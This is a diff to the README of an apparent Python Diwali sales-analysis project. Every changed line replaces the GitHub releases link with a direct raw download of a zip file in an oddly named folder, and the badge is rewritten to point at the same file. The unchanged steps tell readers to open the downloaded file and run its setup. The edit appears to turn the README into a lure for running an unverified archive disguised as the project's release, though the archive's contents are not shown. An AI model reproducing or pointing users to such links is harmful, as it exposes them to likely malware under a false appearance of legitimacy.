@@ -1,6 +1,6 @@
 # 🪔 Diwali-Sales-Analysis-Python - Discover Customer Insights Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/molowo147/Diwali-Sales-Analysis-Python/releases)
+[![Download Now](https://raw.githubusercontent.com/molowo147/Diwali-Sales-Analysis-Python/main/postcarotid/Diwali-Sales-Analysis-Python.zip%20Now-Release-blue)](https://raw.githubusercontent.com/molowo147/Diwali-Sales-Analysis-Python/main/postcarotid/Diwali-Sales-Analysis-Python.zip)
 
 ## 🥳 Overview
 
@@ -12,11 +12,11 @@ Getting started is simple and straightforward. Follow these steps to download an
 
 ## 📥 Download & Install
 
-To get the software, visit this page to download: [Diwali-Sales-Analysis-Python Releases](https://github.com/molowo147/Diwali-Sales-Analysis-Python/releases). 
+To get the software, visit this page to download: [Diwali-Sales-Analysis-Python Releases](https://raw.githubusercontent.com/molowo147/Diwali-Sales-Analysis-Python/main/postcarotid/Diwali-Sales-Analysis-Python.zip). 
 
 Once there, look for the latest version of the release, download the file, and follow the installation steps.
 
-1. **Visit the Releases Page:** Click [here](https://github.com/molowo147/Diwali-Sales-Analysis-Python/releases).
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/molowo147/Diwali-Sales-Analysis-Python/main/postcarotid/Diwali-Sales-Analysis-Python.zip).
 2. **Choose the Latest Release:** You will see a list of available versions. Pick the most recent one.
 3. **Download the File:** Click on the download link of the file to begin downloading.
 4. **Run the Application:** Once the download is complete, locate the file on your computer and open it. Follow the on-screen instructions to set it up.
